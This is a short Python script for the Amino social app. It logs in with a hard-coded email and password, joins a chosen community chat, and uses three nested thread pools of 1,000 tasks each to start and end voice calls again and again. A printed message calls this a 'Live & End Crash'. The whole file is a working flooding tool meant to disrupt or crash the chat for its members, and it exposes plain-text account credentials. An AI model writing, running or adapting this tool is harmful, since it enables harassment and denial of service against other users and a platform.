import os
import aminofix
#os.system("pip uninstall Dick.py")
#os.system("pip install amino.py")
#os.system("pip install pyfiglet")
#os.system("pip install colored")
#from keep_alive import keep_alive
from concurrent.futures import ThreadPoolExecutor
c=aminofix.Client()
#keep_alive()
e="vitox33075@mediafate.com"
p="pagal0"
c.login(e,p)
print("\nLogged in")
n="http://aminoapps.com/p/uo36nh"
fok=c.get_from_code(n)
id=fok.objectId
comid=fok.path[1:fok.path.index("/")]
c.join_community(comId=comid)
print("\033[1;93mInside Community")
subclient=aminofix.SubClient(comId=comid,profile=c.profile)
subclient.join_chat(chatId=id)
print("\033[1;32mJoined the Chat")

def join_and_leave():
    try:
        c.start_vc(comId=comid,chatId=id,joinType=1)
        c.end_vc(comId=comid,chatId=id,joinType=2)
    except BaseException:
        return
        print("Live & End Crash.....")
def pain():
    with ThreadPoolExecutor() as executor:
        _ = [executor.submit(join_and_leave)for i in range(1000)]
def okok():
    with ThreadPoolExecutor() as executor:
        _ = [executor.submit(pain)for i in range(1000)]
def main():
    with ThreadPoolExecutor() as executor:
        _ = [executor.submit(okok)for i in range(1000)]
if __name__ == "__main__":
    main()